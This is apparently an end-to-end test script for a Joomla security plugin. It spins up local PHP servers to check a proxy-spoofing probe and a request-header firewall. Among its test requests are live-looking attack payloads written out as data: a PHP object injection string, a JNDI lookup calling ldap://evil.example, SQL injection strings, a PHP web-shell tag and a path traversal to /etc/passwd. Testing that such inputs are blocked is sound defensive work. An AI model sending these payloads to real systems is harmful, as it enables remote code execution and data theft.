<?php
/**
 * End-to-end test of the proxy spoof self-test (AUDIT.md N1): starts two local
 * `php -S` servers (an "origin" running the real plugin class, and an
 * nginx-style appending proxy), then runs the real CLI script against them.
 *
 * Run:  php pkg_colorpack_shield/tests/e2e_proxy_probe.php
 * Not part of run.php (it spawns processes). Exits 0 if all checks pass.
 *
 * @package     Colorpack Shield
 * @copyright   Copyright (C) 2026 COLORPACK CREATION CO., LTD. All rights reserved.
 * @license     GNU General Public License version 3 or later
 */

$php = PHP_BINARY;
$cli = realpath(__DIR__ . '/../plugins/system/colorpack_shield/cli/proxy_probe.php');
$tmp = sys_get_temp_dir() . '/cps-e2e-' . bin2hex(random_bytes(4));
mkdir($tmp);

$pass = 0;
$fail = 0;
$procs = [];

function e2e_port(): int
{
    $s = stream_socket_server('tcp://127.0.0.1:0', $errno, $errstr);
    $name = stream_socket_get_name($s, false);
    fclose($s);

    return (int) substr($name, strrpos($name, ':') + 1);
}

function e2e_start(string $php, int $port, string $router, array $env, array &$procs): void
{
    $proc = proc_open(
        [$php, '-S', "127.0.0.1:$port", $router],
        [0 => ['pipe', 'r'], 1 => ['file', '/dev/null', 'w'], 2 => ['file', '/dev/null', 'w']],
        $pipes,
        null,
        array_merge($_ENV, getenv(), $env)
    );
    $procs[] = $proc;

    for ($i = 0; $i < 60; $i++) {
        $c = @fsockopen('127.0.0.1', $port, $e, $s, 0.1);

        if ($c) {
            fclose($c);

            return;
        }

        usleep(50000);
    }

    fwrite(STDERR, "server on $port did not start\n");
    exit(1);
}

function e2e_cli(string $php, string $cli, string $url, string $config): array
{
    $cmd = escapeshellarg($php) . ' ' . escapeshellarg($cli) . ' --url=' . escapeshellarg($url) . ' --config=' . escapeshellarg($config) . ' 2>&1';
    exec($cmd, $out, $code);

    return [$code, implode("\n", $out)];
}

function e2e_check(string $label, bool $ok, string $detail = ''): void
{
    global $pass, $fail;

    if ($ok) {
        $pass++;

        return;
    }

    $fail++;
    echo "  FAIL: $label\n" . ($detail !== '' ? "        $detail\n" : '');
}

$secret = 'e2e-secret-' . bin2hex(random_bytes(4));
file_put_contents("$tmp/good.php", "<?php\nclass JConfig {\n    public \$secret = '$secret';\n}\n");
file_put_contents("$tmp/other.php", "<?php\nclass JConfig {\n    public \$secret = 'a-different-secret';\n}\n");
file_put_contents("$tmp/empty.php", "<?php\nclass JConfig {\n    public \$secret = '';\n}\n");

$router = static fn (string $name): string => realpath(__DIR__ . "/e2e/$name");

try {
    $origin = e2e_port();
    $proxy  = e2e_port();
    $proxyOut = e2e_port();

    e2e_start($php, $origin, $router('origin.php'), ['CPS_E2E_SECRET' => $secret, 'CPS_E2E_PARAMS' => '{}'], $procs);
    e2e_start($php, $proxy, $router('proxy.php'), ['CPS_E2E_ORIGIN' => "127.0.0.1:$origin"], $procs);
    e2e_start($php, $proxyOut, $router('proxy.php'), ['CPS_E2E_ORIGIN' => "127.0.0.1:$origin", 'CPS_E2E_CLIENT' => '198.51.100.40'], $procs);

    echo "== E2E: CLI → origin directly (client headers reach PHP untouched) ==\n";
    [$code, $out] = e2e_cli($php, $cli, "http://127.0.0.1:$origin/", "$tmp/good.php");
    e2e_check('exit code 2', $code === 2, "got $code");
    e2e_check('says SPOOFABLE', str_contains($out, 'SPOOFABLE'), $out);
    e2e_check('shows what PHP received', str_contains($out, 'X-Forwarded-For=104.16.0.1') && str_contains($out, 'REMOTE_ADDR=127.0.0.1'), $out);
    e2e_check('shows nothing trusted by default', str_contains($out, 'Trusted now : (none)'), $out);

    echo "== E2E: CLI → nginx-style appending proxy, tester on the server ==\n";
    [$code, $out] = e2e_cli($php, $cli, "http://127.0.0.1:$proxy/", "$tmp/good.php");
    e2e_check('exit code 3', $code === 3, "got $code");
    e2e_check('says INCONCLUSIVE and explains why', str_contains($out, 'INCONCLUSIVE') && str_contains($out, 'server side'), $out);

    echo "== E2E: CLI → appending proxy, tester from a public address ==\n";
    [$code, $out] = e2e_cli($php, $cli, "http://127.0.0.1:$proxyOut/", "$tmp/good.php");
    e2e_check('exit code 0', $code === 0, "got $code");
    e2e_check('says SAFE', str_contains($out, 'SAFE') && !str_contains($out, 'SPOOFABLE'), $out);
    e2e_check('forged edge was not believed', str_contains($out, 'visitor=127.0.0.1'), $out);

    echo "== E2E: secret problems ==\n";
    [$code, $out] = e2e_cli($php, $cli, "http://127.0.0.1:$origin/", "$tmp/other.php");
    e2e_check('wrong secret → error exit 1, no report', $code === 1 && str_contains($out, 'not a probe report'), $out);
    [$code, $out] = e2e_cli($php, $cli, "http://127.0.0.1:$origin/", "$tmp/empty.php");
    e2e_check('empty secret → error exit 1', $code === 1 && str_contains($out, 'non-empty'), $out);
    [$code, $out] = e2e_cli($php, $cli, "http://127.0.0.1:$origin/", "$tmp/missing.php");
    e2e_check('missing config → error exit 1', $code === 1 && str_contains($out, 'Cannot read'), $out);
    [$code, $out] = e2e_cli($php, $cli, 'ftp://example.com/', "$tmp/good.php");
    e2e_check('non-http URL → error exit 1', $code === 1 && str_contains($out, 'http(s)'), $out);

    echo "== E2E: header inspection with real HTTP headers (php -S origin) ==\n";

    $get = static function (int $port, array $headers): array {
        $ch = curl_init("http://127.0.0.1:$port/");
        curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_HTTPHEADER => $headers, CURLOPT_TIMEOUT => 10]);
        $body = (string) curl_exec($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
        unset($ch);

        return [$code, $body];
    };

    $browser = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Accept: text/html,application/xhtml+xml,*/*;q=0.8', 'Accept-Language: th-TH,th;q=0.9,en;q=0.8', 'Accept-Encoding: gzip',
        "Referer: http://127.0.0.1:$origin/index.php?option=com_content&view=article&id=12",
    ];

    [$st, $b] = $get($origin, $browser);
    e2e_check('real browser-like headers (own-site Referer included) pass', $st === 200 && $b === 'NOT-A-PROBE', "$st $b");

    [$st, $b] = $get($origin, ['User-Agent: }__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";N;}']);
    e2e_check('PHP object injection in User-Agent → 403 Forbidden', $b === 'Forbidden', "$st $b");

    [$st, $b] = $get($origin, ['User-Agent: ${jndi:ldap://evil.example/a}']);
    e2e_check('JNDI lookup in User-Agent → Forbidden', $b === 'Forbidden', "$st $b");

    [$st, $b] = $get($origin, ["X-Forwarded-For: 1.2.3.4' OR SLEEP(5)-- -"]);
    e2e_check('SQLi in X-Forwarded-For → Forbidden', $b === 'Forbidden', "$st $b");

    [$st, $b] = $get($origin, ['User-Agent: <?php system($_GET[1]); ?>']);
    e2e_check('PHP tag in User-Agent → Forbidden', $b === 'Forbidden', "$st $b");

    [$st, $b] = $get($origin, ["User-Agent: 1' UNION SELECT user,pass FROM x-- -"]);
    e2e_check('log-only finding (UNION SELECT in User-Agent) does not block', $b === 'NOT-A-PROBE', "$st $b");

    [$st, $b] = $get($origin, ['Authorization: Bearer a\'--<?php', 'X-Joomla-Token: <script>']);
    e2e_check('Authorization / token headers are not inspected', $b === 'NOT-A-PROBE', "$st $b");

    [$st, $b] = $get($proxy, array_merge($browser, ['Accept-Language: ../../../../etc/passwd']));
    e2e_check('attack header survives a proxy hop and is still blocked', $b === 'Forbidden', "$st $b");

    [$st, $b] = $get($proxy, $browser);
    e2e_check('a clean request through the appending proxy passes (proxy-added X-Forwarded-For / X-Real-IP are valid)', $b === 'NOT-A-PROBE', "$st $b");

    // An ordinary request (no probe token) must not leak a report.
    $body = (string) file_get_contents("http://127.0.0.1:$origin/");
    e2e_check('plain request to the origin returns no report', $body === 'NOT-A-PROBE', $body);
} finally {
    foreach ($procs as $p) {
        proc_terminate($p);
        proc_close($p);
    }

    array_map('unlink', glob("$tmp/*") ?: []);
    @rmdir($tmp);
}

echo "\nE2E PASS: $pass   FAIL: $fail\n";
exit($fail === 0 ? 0 : 1);
